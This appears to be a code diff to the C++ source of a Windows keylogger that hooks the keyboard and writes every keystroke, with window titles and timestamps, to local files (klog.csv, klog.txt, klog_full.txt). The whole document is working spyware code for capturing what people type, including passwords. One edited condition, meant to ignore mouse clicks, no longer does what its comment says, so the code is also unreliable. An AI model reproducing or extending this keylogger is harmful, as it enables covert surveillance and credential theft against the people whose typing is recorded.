@@ -36,14 +36,15 @@ HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
 
 std::ofstream OUTPUT_FILE;
+std::ofstream OUTPUT_FILE_STRINGS;
+std::ofstream OUTPUT_FILE_FULL;
 
-extern char lastwindow[256];
+char lastwindow[256];
 
 int Save(int key_stroke)
 {
-	char lastwindow[256] = "";
 
-	if ((key_stroke == 1) || (key_stroke == 2))
+	if ((key_stroke >= 1) && (key_stroke == 6))
 		return 0; // ignore mouse clicks
 
 	HWND foreground = GetForegroundWindow();
@@ -57,20 +58,21 @@ int Save(int key_stroke)
 
 	if (foreground)
 	{
-		char window_title[256];
+		char window_title[256] = "";
 		GetWindowText(foreground, window_title, 256);
+		
+		// get time
+		time_t t = time(NULL);
+		struct tm timeinfo;
+		localtime_s(&timeinfo, &t);
+		char s[64];
+		strftime(s, sizeof(s), "%c", &timeinfo);
+
+		OUTPUT_FILE << "\n" << window_title << "," << s << ",";
 
 		if (strcmp(window_title, lastwindow) != 0) {
 			strcpy_s(lastwindow, window_title);
-
-			// get time
-			time_t t = time(NULL);
-			struct tm timeinfo;
-			localtime_s(&timeinfo, &t);
-			char s[64];
-			strftime(s, sizeof(s), "%c", &timeinfo);
-
-			OUTPUT_FILE << "\n" << window_title << "," << s << ",";
+			OUTPUT_FILE_STRINGS << "\n" << s << "," << window_title << ",";
 		}
 	}
 
@@ -126,8 +128,13 @@ int Save(int key_stroke)
 		if (!lowercase) key = tolower(key);
 		OUTPUT_FILE << char(key);
 	}
+	OUTPUT_FILE << "," << key_stroke;
+	OUTPUT_FILE_STRINGS << "," << key_stroke;
+	OUTPUT_FILE_FULL << "," << key_stroke;
 	//instead of opening and closing file handlers every time, keep file open and flush.
 	OUTPUT_FILE.flush();
+	OUTPUT_FILE_STRINGS.flush();
+	OUTPUT_FILE_FULL.flush();
 	return 0;
 }
 
@@ -382,6 +389,8 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _
 
 	//open output file in append mode
 	OUTPUT_FILE.open("klog.csv", std::ios_base::app);
+	OUTPUT_FILE_STRINGS.open("klog.txt", std::ios_base::app);
+	OUTPUT_FILE_FULL.open("klog_full.txt", std::ios_base::app);
 
 	// Set the hook
 	SetHook();
